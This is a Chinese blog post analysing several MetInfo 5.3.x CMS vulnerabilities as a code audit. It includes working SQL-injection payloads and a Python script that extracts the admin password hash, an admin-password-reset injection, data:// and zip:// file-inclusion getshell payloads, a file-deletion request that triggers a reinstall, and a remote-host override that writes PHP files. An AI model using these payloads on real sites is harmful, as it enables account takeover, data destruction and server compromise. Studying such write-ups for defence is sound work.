---
title: metinfo5.3漏洞分析
url: 340.html
id: 340
categories:
  - php
  - 代码审计
date: 2018-05-21 15:48:52
tags:
---

# Metinfo 5.3.17 前台SQL注入漏洞分析


主要是参考[p神的文章 ](https://www.leavesongs.com/PENETRATION/metinfo-5.3.17-sql-injection.html) 注入点出现再一个公共函数库中`/include/global.func.php`中的`jump_pseudo()`
```php
    function jump_pseudo(){
    	global $db,$met_skin_user,$pseudo_jump;
    	global $met_column,$met_news,$met_product,$met_download,$met_img,$met_job;
    	global $class1,$class2,$class3,$id,$lang,$page,$selectedjob;
    	global $met_index_type,$index,$met_pseudo;
    	if($met_pseudo){
    		$metadmin[pagename]=1;
    		$pseudo_url=$_SERVER[HTTP_X_REWRITE_URL]?$_SERVER[HTTP_X_REWRITE_URL]:$_SERVER[REQUEST_URI];
    		$pseudo_jump=@strstr($_SERVER['SERVER_SOFTWARE'],'IIS')&&$_SERVER[HTTP_X_REWRITE_URL]==''?1:$pseudo_jump;
    		$dirs=explode('/',$pseudo_url);
    		$dir_dirname=$dirs[count($dirs)-2];
    		$dir_filename=$dirs[count($dirs)-1];
    		if($pseudo_jump!=1){
    			$dir_filenames=explode('?',$dir_filename);
    			switch($dir_filenames[0]){
    				case 'index.php':
    					if(!$class1&&!$class2&&!$class3){
    						if($index=='index'){
    							if($lang==$met_index_type){
    								$jump['url']='./';
    							}else{
    								$jump['url']='index-'.$lang.'.html';
    							}
    						}else{
    							if($lang==$met_index_type){
    								$jump['url']='./';
    							}else{
    								$id=$class3?$class3:($class2?$class2:$class1);
    								if($id){
    									$query="select * from $met_column where id='$id'";
    								}else{
    									$query="select * from $met_column where foldername='$dir_dirname' and lang='$lang' and (classtype='1' or releclass!='0') order by id asc";
    								}
    								$jump=$db->get_one($query);
    								$psid= ($jump['filename']<>"" and $metadmin['pagename'])?$jump['filename']:$jump['id'];
    								if($jump[module]==1){
    									$jump['url']='./'.$psid.'-'.$lang.'.html';
    								}else if($jump[module]==8){
    									$jump['url']='./'.'index-'.$lang.'.html';
    								}
    								else{
    									if($page&&$page!=1)$psid.='-'.$page;
    									$jump['url']='./'.'list-'.$psid.'-'.$lang.'.html';
    								}
    							}
    						}
    					}else{
    						……
    					}
    					break;
    			……
    			if($jump['url']){
    				$jump['url']=str_replace('./','',$jump['url']);
    				$jump['url']='http://'.$_SERVER[HTTP_HOST].str_replace($dir_filename,$jump['url'],$_SERVER[REQUEST_URI]);
    				Header("HTTP/1.1 301 Moved Permanently"); 
    				Header("Location: $jump[url]");	
    			}
    		}
    	}
    }
```
主要着眼于这两个语句  
`$pseudo_url=$_SERVER[HTTP_X_REWRITE_URL]?$_SERVER[HTTP_X_REWRITE_URL]:$_SERVER[REQUEST_URI];` 
**`$query="select * from $met_column where foldername='$dir_dirname' and lang='$lang' and (classtype='1' or releclass!='0') order by id asc";`**  

其中的`$dir_dirname`变量也是由`$pseudo_url`所决定的
```php
$dirs=explode('/',$pseudo_url); 
$dir_dirname=$dirs[count($dirs)-2];
```
由于`$pseudo_url`的获取方式是直接从http头获取，而过滤函数也仅仅只是对\_GET、\_POST、_COOKIE这几个函数进行了过滤，恰好http头是可以控的，所以只要能成功进入sql执行语句，就可以触发sql注入
```php
    foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
    	foreach($$_request as $_key => $_value) {
    		$_key{0} != '_' && $$_key = daddslashes($_value,0,0,1);
    		$_M['form'][$_key] = daddslashes($_value,0,0,1);
    	}
    }
```
最后执行后的结果会存放在jump\[url\]中，然后再location的响应头中能看见 里面由很多if、switch case的判断，我简单罗列一下要进入sql语句的条件
*   if($met_pseudo)
*   if($pseudo_jump!=1)
*   switch($dir_filenames\[0\])   case 'index.php'
*   ! if(!$class1&&!$class2&&!$class3)
*   ! $index=='index'
*   ! if($lang==$met\_index\_type)
*   ! $id

需要寻找一下这些变量是从何而来的 
- `$met_pseudo=0;//关闭伪静态` 意为该变量是代表着该系统是否开启了伪静态，这个也是漏洞触发的一个限制条件。需要管理员开启了伪静态配置 
- `$pseudo_jump=@strstr($_SERVER['SERVER_SOFTWARE'],'IIS')&&$_SERVER[HTTP_X_REWRITE_URL]==''?1:$pseudo_jump;`满足`if($pseudo_jump!=1)`的话只需要web\_server不是iis或者http\_x\_rewrite\_url的存在即可 
- 只要$psedudo_url最后一个参数设为index即可满足条件

$dirs=explode('/',$pseudo_url); 
$dir_filename=$dirs\[count($dirs)-1\];

- class1、2、3只要不主动传入即为空 
- $index变量不传入时为index，只要任意传入一个index变量后即为指定的参数 
- 一个比较头大的地方 当传入?lang=cn时，会使条件不成立。传入en时，由于metinfo获取配置变量是根据lang从数控中获取的。然而英文不存在伪静态配置，会恢复默认配置，导致条件一失败。不传入时则会报错 mysql的一个大小写特性，选择字符格式时，会有如下后缀`ci`、`cs`、`bin` ci 表示 case insensitive （大小写不敏感） cs 表示 case sensitive （大小写敏感） bin 表示按照二进制比较 此处，表则是使用的ci（自我感觉大多数表也都用的时是这个） 所以当我们传入大小写混写时，能成功选出配置参数，也能绕过!(Cn==cn) 
- class1、2、3为空时条件成立 调用该函数的页面也就只有一个index.php。根据以上分析，可以如下构造http请求

*   lang=Cn  (get)
*   index=xx  (get)
*   X\_REWRITE\_URL : x' union select 1,2,3,admin\_pass,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 from met\_admin_table limit 1#/index.php          (http头)

![](http://blog.kingkk.com/wp-content/uploads/2018/05/86edb33b487c52b94dce8dfb2bdb6bae.png) 最后附上小型的检测脚本把
```python
#encoding=utf8
import requests,re

url = "http://localhost/metinfo5.3"

params = dict(lang='Cn',index='')
url+='/index.php'
headers = {"X-Rewrite-Url": "x' union select 1,2,3,admin_pass,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 from met_admin_table limit 1#/index.php"}
r = requests.get(url,params=params,headers=headers,allow_redirects=False)
t = re.search('list-(.*)-Cn',r.headers['Location'])
print(t.group(1))
```
 
  
# Metinfo 5.3.1注入漏洞

参考[文章](https://www.secpulse.com/archives/41084.html) 
漏洞主要是利用json_encode时会对双引号、转义符进行转义，导致单引号的逃逸 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/bf2af2bd685ddfab6c30139a1c54bbf5.png)![](http://blog.kingkk.com/wp-content/uploads/2018/05/50a531852ae60e972275e7b5f4c36ada.png) 
在`admin/include/global.func.php`的1456行`save_met_cookie`函数
```php
    function save_met_cookie(){
    	global $met_cookie,$db,$met_admin_table;
    	$met_cookie['time']=time();
    	$json=json_encode($met_cookie);
    	$username=$met_cookie[metinfo_admin_id]?$met_cookie[metinfo_admin_id]:$met_cookie[metinfo_member_id];
    	$username=daddslashes($username,0,1);
    	$query="update $met_admin_table set cookie='$json' where id='$username'";
    
    	$user=$db->query($query);
    	die($query);
    }
```
这里对met\_cookie进行json\_encode之后，就直接插入数据库。 接下来找下$met_cookie定义的地方， 
在`/admin/include/common.inc.php`中73行开始 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/542581b1794be4fee3f0b96e52bc77a6.png) 
其实一开始不是很懂他在干什么，后来想想可能是怕$met\_cookie变量覆盖把，但是这样直接覆盖$met\_cookie_filter也似乎没什么区别 
找一个函数的利用页面 `/admin/login_check.php` 里面有几处调用了这个函数， 
本来是想着分析下运行逻辑的，后来嫌麻烦先直接运行下，在save\_met\_cookie()这下了个断点，直接输出下语句看看 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/e4b158e2e61d43a5a2882e9314d780e9.png) 
发现确实是成功进来了，也覆盖了之前的$met_cookie变量 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/679dec0fa980c7e186b6396fa21025ab.png) 
试着构造下变量`met_cookie_filter[a]=a' where id=sleep(3)%23` 
成功延时三秒，表示注入成功，可以进行延时注入 
或者直接修改下管理员密码`met_cookie_filter[a]=a',admin_pass=md5(123456) where id=1%23` 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/38166c2a8f4458774252a988f9880d36.png)  




# MetInfo 5.3.12 注入漏洞


参考[链接](http://0day5.com/archives/4193/) 这个漏洞产生的原因和漏洞挖掘的方法主要有如下几点

*   利用未对$_SERVER变量进行处理直接带入sql语句，导致的sql注入
*   利用$\_SERVER\['PHP\_SELF'\]的可伪造性，使得注入语句可控

先来了解下$\_SERVER\['PHP\_SELF'\]这个变量，不妨先把，$\_SERVER var\_dump一下 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/0a24b7eb0efbb4c887b7f37dc30d43bd.png)

*   request_uri  是除去host的完整uri
*   script_name 则是当前运行的脚本
*   php_self 则是当前出去host的url路径

另一种方式比较script\_name和php\_self可能更加明显 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/d504145f3afe7219a85f2bc4801059ab.png) 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/fd4599ed03b7496304b208dd5448cfa1.png) 
然后来说下这次的漏洞，漏洞发生在`\app\system\include\compatible\metv5_top.php`文件下

    //获取当前应用栏目信息
    $PHP_SELF = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
    $PHP_SELFs = explode('/', $PHP_SELF);
    $query = "SELECT * FROM {$_M['table'][column]} where module!=0 and foldername = '{$PHP_SELFs[count($PHP_SELFs)-2]}' and lang='{$_M['lang']}'";
    $column = DB::get_one($query);

这里$PHP\_SELF变量就是从$\_SERVER\['PHP_SELF'\]中获取的，并且没做任何过滤，用 / 分割，并取了倒数第二个量插入数据库 
接下来就是寻找下调用该文件的地方（其实感觉这种深层调用还是比较难找） 
然后找到一个`/member/login.php`页面 先查看一下正常进入时的变量 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/c5b59d0017d32301467e6936575d0545.png) 
可以看见，取的变量就是以 / 分割后的倒数第二个变量,尝试一下进行构造url
```
member/login.php/1'%20or%20sleep(3)%20%23/a
```
![](http://blog.kingkk.com/wp-content/uploads/2018/05/e0e6fc59e7d42c16d368b4cede436260.png) 
发现语句以及成功被注入了，也成功的进行的延时  



# Metinfo5.3.10版本Getshell


参考[柠檬师傅的文章](http://www.cnblogs.com/iamstudy/articles/Metinfo_5-3-10_include.html) 
漏洞形成原因还是由于metinfo的全局变量覆盖，导致`$depth`变量未进行初始化然后产生的变量覆盖漏洞。 
漏洞形成于`\admin\login\login_check.php`中 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/9a0679cb633f64df3c9cd3b92c182e91.png) 
此处可以很明显的看到，在包含了common.inc之后，并未对$depth进行重新赋值，然后传入到require_once中，导致了文件包含 
不过感觉师傅们的利用技巧也十分精妙，学到了一手 

虽然此处对$depth变量进行了包含，但是后面也连同上了`../include/captcha.class.php`这些字符串，这个就是新学到的一些利用技巧和姿势了。 
在php的文件包含中，就不得不提到php的伪协议（关于php伪协议的利用，大家可以参考下[这篇文章](http://www.freebuf.com/column/148886.html)）

这里主要利用了`zip://`和`data://`两个伪协议 先来看下**`data://`**伪协议的利用姿势 `data://`协议是受限于`allow_url_fopen`和`allow_url_include`的 
也就是远程文件打开和远程文件包含，`allow_url_fopen`默认情况下就是打开的，`allow_url_include`则是需要手动打开，利用需要一些条件 先来看下payload再一起分析吧

GET：  ?&depth=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==
POST:  action=login&met\_login\_code=1

![](http://blog.kingkk.com/wp-content/uploads/2018/05/90c73d29ff5d4cf8a7dfaab9994d0ae9.png) 
POST中两个参数，是为了变量覆盖，然后进入到文件包含的语句当中。 GET中的$depth，不妨先看下完整的包含的路径
```
data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==../include/captcha.class.php
```
这样就相当于将`../include/captcha.class.php`也当作base64的一部分，然后试着将后面内容解码 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/7620dc6737b5a42951fb5d18eef33aa2.png) 
可以看到，利用//将后面的乱码部分进行注释，从而绕过了字符串连接的限制，并成功的进行了代码执行。   
然而默认情况下`allow_url_include`是关闭的，也一般没什么人会去自动打开，这时，`zip://`这种利用技巧虽然有些麻烦，但是适用度就更加广了 `zip://`的使用方法

> zip://archive.zip#dir/file.txt zip:// \[压缩文件绝对路径\]#\[压缩文件内的子文件名\]

`zip://`协议会对该文件进行解析（即使后缀不是zip），然后包含zip下对应的文件 
再选择对应文件名时，是用#分割，恰好可以利用这一点，将无用的`../include/captcha.class.php`这些字符串利用起来 

具体的构造方法： 
先构造`aa/include/captcha.class.php`这样一个对应文件夹下的文件
然后压缩成zip,再用二进制编辑器打开，将对应的aa处改成.. 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/b3ba1404cb4893e62df65d259b70562f.png) 
修改下后缀名，再member处就有一个上传头像的地方，将文件上传 
这时候的包含路径就变成了

zip://D:\\\Program Files\\\wamp\\\www\\\metinfo5.3\\\upload\\\head\\\1.png#../include/captcha.class.php

构造一下payload

GET: http://localhost/metinfo5.3/admin/login/login_check.php?langset=cn&depth=zip://D:\\Program Files\\wamp\\www\\metinfo5.3\\upload\\head\\1.png%23
POST： action=login&met\_login\_code=1

这里`zip://`似乎不能用相对路径，所以想要成功包含，还得提前知道web目录的路径 成功执行 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/9e76ba15f255eab0cad99bb9e005838d.png)  



# metinfo全版本csrf重装漏洞


感觉metinfo的漏洞主要都是围绕着那个伪全局变量展开的，感觉修修补补一般都治标不治本 
这回这个漏洞依旧是利用变量未初始化，导致的变量覆盖，从而任意文件删除，参考[文章](https://blog.csdn.net/u011066706/article/details/51176286) 

漏洞发生在`admin\app\batch\csvup.php`文件下 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/a06436e6102102cb1b330c55ef95dbf3.png) 
可以看到$filenamecsv在此之前并没有进行过赋值，那也就意味着可以任意文件删除 
接下来看下触发到这一行的条件

*   第二行的login_check.php对身份验证
*   `$classcsv`要有值存在

身份验证的也是这个漏洞的一个限制条件，要么有管理员权限，要么后期构造利用csrf让管理员触发 
`$classcsv`变量可以溯源看到是由`$fileField`变量而来
然而`$fileField`也一样是可以被覆盖的 
于是构造payload
```
?fileField=1&flienamecsv=../../../robots.txt
```
成功删除了robots.txt，实际中可以删除install.lock文件，导致系统重装  



# metinfo后台getshell


版本暂时不详，本地测试的是5.3.5，参考[文章](http://www.91ri.org/16663.html) 
漏洞发生在`/admin/app/physical/physical.php`文件中的网站扫描功能 
其会访问metinfo官网提供的api接口，从而更新本地的php文件，由于接口地址的可覆盖，导致了任意写入php文件导致getshell 
漏洞发生代码如下
```php
if($physicaldo[11]==1){
	require_once $depth.'../../include/export.func.php';
	$met_file='/dl/standard.php';
	$post=array('ver'=>$metcms_v,'app'=>$applist);
	$result=curl_post($post,60);
		if(link_error($result)==1){
		$results=explode('',$result);
		file_put_contents('dlappfile.php',$results[1]);
		file_put_contents('standard.php',$results[0].$results[1]);
	}
	if(file_exists('standard.php')){filescan('../../..','standard.php');}
	else{$physical_file="0";}
}
```
看到写入文件的$result是又curl\_post获取的，跟进curl\_post函数看下
```php
    function curl_post($post,$timeout){
    global $met_weburl,$met_host,$met_file;
    $host=$met_host;
    $file=$met_file;
    	if(get_extension_funcs('curl')&&function_exists('curl_init')&&function_exists('curl_setopt')&&function_exists('curl_exec')&&function_exists('curl_close')){
    		$curlHandle=curl_init(); 
    		curl_setopt($curlHandle,CURLOPT_URL,'http://'.$host.$file); 
    		curl_setopt($curlHandle,CURLOPT_REFERER,$met_weburl);
    		curl_setopt($curlHandle,CURLOPT_RETURNTRANSFER,1); 
    		curl_setopt($curlHandle,CURLOPT_CONNECTTIMEOUT,$timeout);
    		curl_setopt($curlHandle,CURLOPT_TIMEOUT,$timeout);
    		curl_setopt($curlHandle,CURLOPT_POST, 1);	
    		curl_setopt($curlHandle,CURLOPT_POSTFIELDS, $post);
    		$result=curl_exec($curlHandle); 
    		curl_close($curlHandle); 
    		//die($result);
    	}
    	……
```
想要伪造`$result`的话，主要可以伪造的变量有`$met_host`和$`met_file` 
然而`$met_file`在传入之前进行了重新赋值`$met_file='/dl/standard.php';`，
然而`$met_host`并没有进行重新赋值 
根据metinfo的伪全局变量，就可以传入参数覆盖`$met_host` 
于是可以在自己的服务器中新建 `/dl/standard.php`文件如下
```
metinfo<Met><?php echo "<?php phpinfo();?>";?><Met><?php echo "<?php phpinfo();?>";?>
```
然后构造如下payload
```
admin/app/physical/physical.php?action=do&met_host=127.0.0.1
```
成功写入 
![](http://blog.kingkk.com/wp-content/uploads/2018/05/02afc33c5d687f744e7cf8a31d0a7a7f.png)